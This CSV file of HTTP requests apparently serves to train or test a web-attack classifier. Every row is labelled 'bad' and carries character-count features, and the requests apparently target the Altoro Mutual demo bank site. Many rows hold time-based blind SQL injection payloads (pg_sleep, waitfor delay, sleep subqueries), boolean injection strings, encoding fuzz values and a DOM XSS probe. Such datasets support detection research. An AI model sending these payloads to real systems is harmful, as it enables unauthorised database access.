method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/feedback.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=oKxldL4I';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=%bf'%bf%22,1,1,0,0,2,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/search.jsp?query=8ylKnqGY');select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=%5c&name=brkbujqv&subject=1&submit=Submit,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=k6O4yNOr';select%20pg_sleep(9);%20--%20,1,0,1,1,3,3,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/TazZa31w');select%20pg_sleep(6);%20--%20.htm,,1,0,1,1,3,2,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1%20OR%203%2b543-543-1%3d0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=%5c&txtEmail=sample%40email.tst,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/%5c.htm,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/swagger/%bf'%bf%22.html,,1,1,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=BqkZ9dlE';%20waitfor%20delay%20'0:0:9'%20--%20,,3,0,1,0,5,2,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%c0%00xa7%c0%a2,0,0,0,0,0,1,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/.htm,,2,2,0,15,0,9,bad
GET,/util/serverStatusCheckService.jsp?HostName=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,"/login.jsp?wvstest=javascript:domxssExecutionSink(1,%22%3Cbr%3E()locxss%22)&",,0,2,0,2,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%bf'%bf%22&subject=1&submit=Submit,1,1,0,0,2,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=1%c0%00xa7%c0%a2&uid=1,0,0,0,0,0,1,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=JyI%3d,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=JyI%3d&submit=Submit,0,0,0,0,2,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/survey_questions.jsp?step=1%c0%00xa7%c0%a2,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1));%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
POST,/doLogin,btnSubmit=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&passw=g00dPa%24%24w0rD&uid=1,2,2,0,15,0,10,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1t30ITCS');select%20pg_sleep(3);%20--%20,1,0,1,1,3,3,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/inside_points_of_interest.htm,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/index'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'wKei'%3d'wKei.html,,4,0,0,0,4,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/swagger/1L7v5uAE';%20waitfor%20delay%20'0:0:3'%20--%20.html,,3,0,1,0,5,2,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/1%c0%00xa7%c0%a2.htm,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%f0''%f0%22%22,2,2,0,0,0,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=JyI%3d,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/search.jsp?query=1'%22,,1,1,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=Gk2byTSM');select%20pg_sleep(9);%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,1,0,1,1,5,2,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/default.jsp?content=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,,2,2,0,15,0,9,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=-1%20OR%202%2b86-86-1%3d0%2b0%2b0%2b1%20--%20&subject=1&submit=Submit,0,0,1,0,6,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/swagger/JyI%3d.html,,0,0,0,0,0,0,bad
GET,/subscribe.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%2520Laguna%2520Street&name=xmsktkqj&subject=1&submit=Submit,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,3,bad
GET,/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%5c,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=%bf'%bf%22&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=Submit,1,1,0,0,2,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/default.jsp?content=1%c0%00xa7%c0%a2,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/swagger/%f0''%f0%22%22.html,,2,2,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=fvJDIz1P');%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,2,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=%40%40fJPou&passw=g00dPa%24%24w0rD&uid=1,0,0,0,0,0,1,bad
GET,/,,0,0,0,0,0,0,bad
GET,/default.jsp?content=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/,,2,2,0,14,0,3,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=-1));%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=3137%20Laguna%20Street&name=xmsktkqj&subject=1&submit=Submit,2,0,1,0,7,2,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/util/serverStatusCheckService.jsp?HostName=%40%40a3yqX,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/Yb85KIlE';%20waitfor%20delay%20'0:0:9'%20--%20.htm,,3,0,1,0,5,2,bad
GET,/doSubscribe,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,3,bad
GET,/altoro/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/swagger/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/,,0,0,0,0,3,0,bad
GET,/images,,0,0,0,0,0,0,bad
GET,/altoro/images/,,0,0,0,0,0,0,bad
GET,/search.jsp,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=3j8szwtv';select%20pg_sleep(3);%20--%20&txtEmail=sample%40email.tst,1,0,1,1,3,2,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/my%20documents/JohnSmith/,,0,0,0,0,1,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=brkbujqv&subject=1&submit=%5c,0,0,0,0,2,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,bad
GET,/my%20documents/,,0,0,0,0,1,0,bad
GET,/index.jsp?content=personal_loans.htm%25'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'pPTl'%21%3d'pPTl%25,,4,0,0,0,4,0,bad
GET,/doLogin,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%c0%00xa7%c0%a2,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,0,bad
GET,/sendFeedback,,0,0,0,0,0,0,bad
GET,/util/,,0,0,0,0,0,0,bad
GET,/pr/,,0,0,0,0,0,0,bad
